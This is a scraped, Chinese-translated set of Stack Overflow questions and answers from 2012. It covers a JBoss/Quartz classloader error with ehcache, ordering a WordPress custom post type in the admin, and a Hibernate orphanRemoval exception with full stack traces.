我正在使用 JBoss 4.2.3.GA 并部署一个使用 Hibernate 4.1.5.SP1 的 JAR 应用程序。在我的 JAR 中，我有一个 Quartz 作业，配置如下......

```
@MessageDriven(activationConfig = {@ActivationConfigProperty(propertyName = "cronTrigger", propertyValue = "0 40 12 * * ?")})
@ResourceAdapter("quartz-ra.rar")
@Depends({
"jboss.ejb:service=EJBTimerService"})
public class UpdateOrgsJob implements Job { 
```

我认为 JBoss 在一个单独的类加载器中加载 Quartz，而不是在我的 JAR 类被引用的地方，因为，即使它在我的 JAR 文件中，我也会收到错误“java.lang.NoClassDefFoundError: net/sf/ehcache/CacheException”。如何让我的 JAR 类对 Quartz 可见？

下面是完整的堆栈跟踪...

```
javax.ejb.EJBTransactionRolledbackException: java.lang.NoClassDefFoundError: net/sf/ehcache/CacheException^M
        at org.jboss.ejb3.tx.Ejb3TxPolicy.handleInCallerTx(Ejb3TxPolicy.java:87)^M
        at org.jboss.aspects.tx.TxPolicy.invokeInCallerTx(TxPolicy.java:130)^M
        at org.jboss.aspects.tx.TxInterceptor$Required.invoke(TxInterceptor.java:195)^M
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:101)^M
        at org.jboss.ejb3.stateless.StatelessInstanceInterceptor.invoke(StatelessInstanceInterceptor.java:62)^M
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:101)^M
        at org.jboss.ejb3.mdb.MessagingContainer.localInvoke(MessagingContainer.java:249)^M
        at org.jboss.ejb3.mdb.inflow.MessageInflowLocalProxy.delivery(MessageInflowLocalProxy.java:268)^M
        at org.jboss.ejb3.mdb.inflow.MessageInflowLocalProxy.invoke(MessageInflowLocalProxy.java:138)^M
        at $Proxy90.execute(Unknown Source)^M
    at org.jboss.resource.adapter.quartz.inflow.QuartzJob.execute(QuartzJob.java:57)^M
        at org.quartz.core.JobRunShell.run(JobRunShell.java:203)^M
        at org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:520)^M
Caused by: java.lang.RuntimeException: java.lang.NoClassDefFoundError: net/sf/ehcache/CacheException^M
        at org.jboss.ejb3.interceptor.InvocationContextImpl.proceed(InvocationContextImpl.java:174)^M
        at org.jboss.ejb3.interceptor.EJB3InterceptorsInterceptor.invoke(EJB3InterceptorsInterceptor.java:63)^M
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:101)^M
        at org.jboss.ejb3.entity.TransactionScopedEntityManagerInterceptor.invoke(TransactionScopedEntityManagerInterceptor.java:54)^M
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:101)^M
        at org.jboss.ejb3.AllowedOperationsInterceptor.invoke(AllowedOperationsInterceptor.java:47)^M
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:101)^M
        at org.jboss.aspects.tx.TxPolicy.invokeInCallerTx(TxPolicy.java:126)^M
        ... 11 more^M
Caused by: java.lang.NoClassDefFoundError: net/sf/ehcache/CacheException^M
        at java.lang.Class.getDeclaredConstructors0(Native Method)^M
        at java.lang.Class.privateGetDeclaredConstructors(Class.java:2389)^M
        at java.lang.Class.getConstructor0(Class.java:2699)^M
        at java.lang.Class.newInstance0(Class.java:326)^M
        at java.lang.Class.newInstance(Class.java:308)^M
        at org.hibernate.cfg.SettingsFactory.createCacheProvider(SettingsFactory.java:375)^M
        at org.hibernate.cfg.SettingsFactory.buildSettings(SettingsFactory.java:245)^M
        at org.hibernate.cfg.Configuration.buildSettings(Configuration.java:2009)^M
        at org.hibernate.cfg.Configuration.buildSessionFactory(Configuration.java:1292)^M
        at org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:713)^M
        at org.hibernate.ejb.HibernatePersistence.createEntityManagerFactory(HibernatePersistence.java:121)^M
        at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:51)^M
        at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:33)^M
        at org.mainco.subco.orgsclient.service.AbstractTransactionService.startOperation(AbstractTransactionService.java:27)^M
        at org.mainco.subco.orgsclient.service.OrganizationServiceImpl.saveOrganization(OrganizationServiceImpl.java:87)^M
        at org.mainco.subco.orgsclient.service.OrganizationServiceImpl.getEODBOrganizations(OrganizationServiceImpl.java:221)^M
        at org.mainco.subco.orgsclient.service.OrganizationServiceImpl.saveOrgsFromWebService(OrganizationServiceImpl.java:183)^M
        at org.mainco.subco.orgsclient.quartz.UpdateOrgsJob.execute(UpdateOrgsJob.java:55)^M
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)^M
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)^M
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)^M
        at java.lang.reflect.Method.invoke(Method.java:597)^M
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:112)^M
        at org.jboss.ejb3.interceptor.InvocationContextImpl.proceed(InvocationContextImpl.java:166)^M
        ... 18 more^M
Caused by: java.lang.ClassNotFoundException: No ClassLoaders found for: net.sf.ehcache.CacheException^M
        at org.jboss.mx.loading.LoadMgr3.beginLoadTask(LoadMgr3.java:212)^M
        at org.jboss.mx.loading.RepositoryClassLoader.loadClassImpl(RepositoryClassLoader.java:521)^M
        at org.jboss.mx.loading.RepositoryClassLoader.loadClass(RepositoryClassLoader.java:415)^M
        at java.lang.ClassLoader.loadClass(ClassLoader.java:247)^M
        ... 42 more^M 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T17:08:03.717

您可以将 ehcache jar 文件放在 ${jboss.server}/lib 中，或者您也可以尝试[Jboss wiki中提到的 2 种方法](https://community.jboss.org/wiki/HowToConfigureAQuartzService)

```
1\.  Delay  Quartz service startup
2\.  set <attribute name="UseJBossWebLoader">true</attribute> 
```

# wordpress - 更改 wordpress 自定义帖子类型后端的菜单顺序

> ID：12009951
> 
> 赞同：0
> 
> 时间：2012-08-17T16:56:02.653
> 
> 标签：wordpress, search, filter, backend

我在 wordpress 的后端，我有一个名为“工作”的自定义帖子类型，我想通过菜单顺序重新排序工作项目（在后端）。我发现了一个名为“pre_get_posts”的操作挂钩，它返回查询，但查询的 post_type 列为“页面”。如何挂钩在后端打印自定义帖子类型的查询？

这是我想要完成但不知道正确的钩子或过滤器：

```
function search_filter($query) {

    if($_GET['post_type'] == 'work' && is_admin())
        $query->query_vars['orderby'] = 'menu_order';

    return $query;
}

add_action('pre_get_posts', 'search_filter'); 
```

# hibernate - JPA-Hibernate - “无法通过..的反射吸气剂获得字段值”

> ID：12009955
> 
> 赞同：8
> 
> 时间：2012-08-17T16:56:49.520
> 
> 标签：hibernate, jpa, spring-mvc

我尝试在 Spring MVC 3.1 应用程序中使用 Hibernate 4.1.5.Final。

*（更新：现在 Hibernate 4.1.6.Final 和 Spring 3.1.2.RELEASE，但仍然没有运气！）*

当我尝试删除一个实体时，我得到一个我不明白的异常。

以下是涉及的两个主要类：

**用户：**

```
@Entity
@Table(name="usertable")
public class User extends BaseModel
{ 
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY) 
    private long id;

    @OneToOne(optional=true, cascade=CascadeType.ALL, mappedBy="user", orphanRemoval=true, fetch=FetchType.LAZY)
    private FacebookAccount facebookAccount;

    // ...

    public long getId()
    {
        return id;
    }

    public void setId(long id)
    {
        this.id = id;
    }

    public FacebookAccount getFacebookAccount()
    {
        return facebookAccount;
    }

    public void setFacebookAccount(FacebookAccount facebookAccount)
    {
        this.facebookAccount = facebookAccount;
    }
} 
```

**脸书账号 ：**

```
@Entity
@Table(name="facebookAccount")
public class FacebookAccount extends BaseModel
{
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY) 
    private Long id;

    @OneToOne
    private User user;

    // ...

} 
```

假设我引用了一个拥有 FacebookAccount 的用户。在事务中（在@Service 中）我尝试做：

```
user.setFacebookAccount(null);
userRepository.save(user); 
```

我也试过：

```
user.setFacebookAccount(null);
facebookAccountRepository.delete(facebookAccount); 
```

两者都有，我得到了这个例外：

```
org.springframework.orm.hibernate3.HibernateSystemException: could not get a field value by reflection getter of com.XXXXX.model.user.User.id; nested exception is org.hibernate.PropertyAccessException: could not get a field value by reflection getter of com.XXXXX.model.user.User.id
    at org.springframework.orm.hibernate3.SessionFactoryUtils.convertHibernateAccessException(SessionFactoryUtils.java:683) ~[spring-orm-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.orm.jpa.vendor.HibernateJpaDialect.translateExceptionIfPossible(HibernateJpaDialect.java:104) ~[spring-orm-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.orm.jpa.JpaTransactionManager.doCommit(JpaTransactionManager.java:516) ~[spring-orm-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:754) ~[spring-tx-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:723) ~[spring-tx-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.transaction.interceptor.TransactionAspectSupport.commitTransactionAfterReturning(TransactionAspectSupport.java:393) ~[spring-tx-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:120) ~[spring-tx-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172) ~[spring-aop-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202) ~[spring-aop-3.1.0.RELEASE.jar:3.1.0.RELEASE] 
```

这是为什么？getId()*确实*存在于用户中并且是公开的！

任何的想法？

**更新 ：**

我做了更多的测试，结论是问题是“orphanRemoval=true”。没有它，我可以使用以下方法删除 FacebookAccount：

```
user.setFacebookAccount(null);
facebookAccountRepository.delete(facebookAccount); 
```

但这并不是我想要的。我希望*orphanRemoval*工作！

**更新 2：**

JPA 中的 orphanRemoval 和 @OneToOne 关系似乎[存在问题。](https://stackoverflow.com/a/5390332/843699)我想我也有同样的问题？

**更新 3：**

BaseModel 类：

```
@MappedSuperclass
public abstract class BaseModel
{
    @Column(name = "dateCreated", nullable = false)
    private Date dateCreated;

    @Column(name = "dateModified", nullable = false)
    private Date dateModified;

    public Date getDateCreated()
    {
        return dateCreated;
    }

    public Date getDateModified()
    {
        return dateModified;
    }

    @PreUpdate
    @PrePersist
    @PreRemove
    protected void prePersist() 
    {
        Date now = DateUtil.now().toDate();
        if(dateCreated == null)
        {
            dateCreated = now;
        }
        dateModified = now;
    }

    @PostUpdate
    @PostPersist
    @PostRemove
    protected void postPersist() 
    {
    }

} 
```

**堆栈跟踪 ：**

```
org.springframework.orm.hibernate3.HibernateSystemException: could not get a field value by reflection getter of com.XXXXX.model.user.User.id; nested exception is org.hibernate.PropertyAccessException: could not get a field value by reflection getter of com.XXXXX.model.user.User.id
    at org.springframework.orm.hibernate3.SessionFactoryUtils.convertHibernateAccessException(SessionFactoryUtils.java:683) ~[spring-orm-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.orm.jpa.vendor.HibernateJpaDialect.translateExceptionIfPossible(HibernateJpaDialect.java:104) ~[spring-orm-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.orm.jpa.JpaTransactionManager.doCommit(JpaTransactionManager.java:516) ~[spring-orm-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:754) ~[spring-tx-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:723) ~[spring-tx-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.transaction.interceptor.TransactionAspectSupport.commitTransactionAfterReturning(TransactionAspectSupport.java:393) ~[spring-tx-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:120) ~[spring-tx-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172) ~[spring-aop-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202) ~[spring-aop-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at com.XXXXX.web.controllers.myprofile.abc.SomeController.facebookAccountConfirmationFormPosted(SomeController.java:272) ~[SomeController.class:na]
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.6.0_22]
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) ~[na:1.6.0_22]
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) ~[na:1.6.0_22]
    at java.lang.reflect.Method.invoke(Method.java:597) ~[na:1.6.0_22]
    at org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:212) ~[spring-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:126) ~[spring-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:96) ~[spring-webmvc-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:617) ~[spring-webmvc-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:578) ~[spring-webmvc-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:80) ~[spring-webmvc-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:900) [spring-webmvc-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:827) [spring-webmvc-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882) [spring-webmvc-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:789) [spring-webmvc-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:727) [javax.servlet-2.5.0.v201103041518.jar:na]
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:820) [javax.servlet-2.5.0.v201103041518.jar:na]
    at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:565) [jetty-servlet-7.6.2.v20120308.jar:7.6.2.v20120308]
    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1360) [jetty-servlet-7.6.2.v20120308.jar:7.6.2.v20120308]
    at org.springframework.orm.jpa.support.OpenEntityManagerInViewFilter.doFilterInternal(OpenEntityManagerInViewFilter.java:147) [spring-orm-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76) [spring-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1331) [jetty-servlet-7.6.2.v20120308.jar:7.6.2.v20120308]
    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88) [spring-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76) [spring-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1331) [jetty-servlet-7.6.2.v20120308.jar:7.6.2.v20120308]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:311) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:116) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:83) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:113) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:101) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:113) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.authentication.rememberme.RememberMeAuthenticationFilter.doFilter(RememberMeAuthenticationFilter.java:146) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:45) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:182) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:87) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at com.XXXXX.util.security.beanutils.AuthenticationManager.doFilter(AuthenticationManager.java:127) [AuthenticationManager.class:na]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323) [spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:173) ~[spring-security-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346) ~[spring-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259) ~[spring-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1331) [jetty-servlet-7.6.2.v20120308.jar:7.6.2.v20120308]
    at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:77) ~[spring-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76) [spring-web-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1331) [jetty-servlet-7.6.2.v20120308.jar:7.6.2.v20120308]
    at com.XXXXX.util.web.filters.SaveGeneratedDynamicResourcesContentFilter.doFilter(SaveGeneratedDynamicResourcesContentFilter.java:60) ~[SaveGeneratedDynamicResourcesContentFilter.class:na]
    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1331) [jetty-servlet-7.6.2.v20120308.jar:7.6.2.v20120308]
    at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:477) ~[na:na]
    at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119) ~[na:na]
    at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:524) ~[na:na]
    at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:227) ~[na:na]
    at org.eclipse.jetty.server.handler.ContextHandler.__doHandle(ContextHandler.java:1031) ~[na:na]
    at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java) ~[na:na]
    at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:406) ~[na:na]
    at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:186) ~[na:na]
    at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:965) ~[na:na]
    at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117) ~[na:na]
    at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:250) ~[na:na]
    at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:149) ~[na:na]
    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:111) ~[na:na]
    at org.eclipse.jetty.server.Server.handle(Server.java:349) ~[na:na]
    at org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:452) ~[na:na]
    at org.eclipse.jetty.server.AbstractHttpConnection.content(AbstractHttpConnection.java:894) ~[na:na]
    at org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.content(AbstractHttpConnection.java:948) ~[na:na]
    at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:857) ~[na:na]
    at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235) ~[na:na]
    at org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:77) ~[na:na]
    at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:609) ~[na:na]
    at org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:45) ~[na:na]
    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:599) ~[na:na]
    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:534) ~[na:na]
    at java.lang.Thread.run(Thread.java:662) ~[na:1.6.0_22]
Caused by: org.hibernate.PropertyAccessException: could not get a field value by reflection getter of com.XXXXX.model.user.User.id
    at org.hibernate.property.DirectPropertyAccessor$DirectGetter.get(DirectPropertyAccessor.java:62) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.tuple.entity.AbstractEntityTuplizer.getIdentifier(AbstractEntityTuplizer.java:341) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.persister.entity.AbstractEntityPersister.getIdentifier(AbstractEntityPersister.java:4425) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.persister.entity.AbstractEntityPersister.isTransient(AbstractEntityPersister.java:4147) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.engine.internal.ForeignKeys.isTransient(ForeignKeys.java:209) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.event.internal.DefaultDeleteEventListener.onDelete(DefaultDeleteEventListener.java:102) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.internal.SessionImpl.fireDelete(SessionImpl.java:954) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.internal.SessionImpl.delete(SessionImpl.java:939) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.engine.internal.Cascade.cascadeProperty(Cascade.java:262) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.engine.internal.Cascade.cascade(Cascade.java:165) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.event.internal.AbstractFlushingEventListener.cascadeOnFlush(AbstractFlushingEventListener.java:160) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.event.internal.AbstractFlushingEventListener.prepareEntityFlushes(AbstractFlushingEventListener.java:151) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.event.internal.AbstractFlushingEventListener.flushEverythingToExecutions(AbstractFlushingEventListener.java:88) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.event.internal.DefaultFlushEventListener.onFlush(DefaultFlushEventListener.java:51) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.internal.SessionImpl.flush(SessionImpl.java:1214) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.internal.SessionImpl.managedFlush(SessionImpl.java:403) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.engine.transaction.internal.jdbc.JdbcTransaction.beforeTransactionCommit(JdbcTransaction.java:101) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.engine.transaction.spi.AbstractTransactionImpl.commit(AbstractTransactionImpl.java:175) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    at org.hibernate.ejb.TransactionImpl.commit(TransactionImpl.java:75) ~[hibernate-entitymanager-4.1.6.Final.jar:4.1.6.Final]
    at org.springframework.orm.jpa.JpaTransactionManager.doCommit(JpaTransactionManager.java:512) ~[spring-orm-3.1.0.RELEASE.jar:3.1.0.RELEASE]
    ... 89 common frames omitted
Caused by: java.lang.IllegalArgumentException: Can not set long field com.XXXXX.model.user.User.id to com.XXXXX.model.social.FacebookAccount
    at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:146) ~[na:1.6.0_22]
    at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:150) ~[na:1.6.0_22]
    at sun.reflect.UnsafeFieldAccessorImpl.ensureObj(UnsafeFieldAccessorImpl.java:37) ~[na:1.6.0_22]
    at sun.reflect.UnsafeLongFieldAccessorImpl.getLong(UnsafeLongFieldAccessorImpl.java:42) ~[na:1.6.0_22]
    at sun.reflect.UnsafeLongFieldAccessorImpl.get(UnsafeLongFieldAccessorImpl.java:18) ~[na:1.6.0_22]
    at java.lang.reflect.Field.get(Field.java:358) ~[na:1.6.0_22]
    at org.hibernate.property.DirectPropertyAccessor$DirectGetter.get(DirectPropertyAccessor.java:59) ~[hibernate-core-4.1.6.Final.jar:4.1.6.Final]
    ... 108 common frames omitted 
```

**更新 4：**

[重现问题的完整且最小的应用程序。](https://github.com/electrotype/so12009955)该问题似乎是使用我的项目 Web 结构（控制器/服务/存储库）发生的，因此应用程序中没有*单元测试*。相反，您必须运行：

```
mvn clean jetty:run 
```

然后将浏览器指向：

```
http://localhost:8080/ 
```

触发异常。将被调用的控制器#method 是 com.example.web.controllers.TestController#test()。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-20T17:40:07.807

尝试更改映射：

[http://www.coderanch.com/t/542400/ORM/databases/delete-option-cascade-Hibernate-one](http://www.coderanch.com/t/542400/ORM/databases/delete-option-cascade-Hibernate-one)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-19T11:50:15.953

你可以检查`https://github.com/bondarenko/so-12009955`你的问题的这个实现。它在我这边工作顺利。

* * *

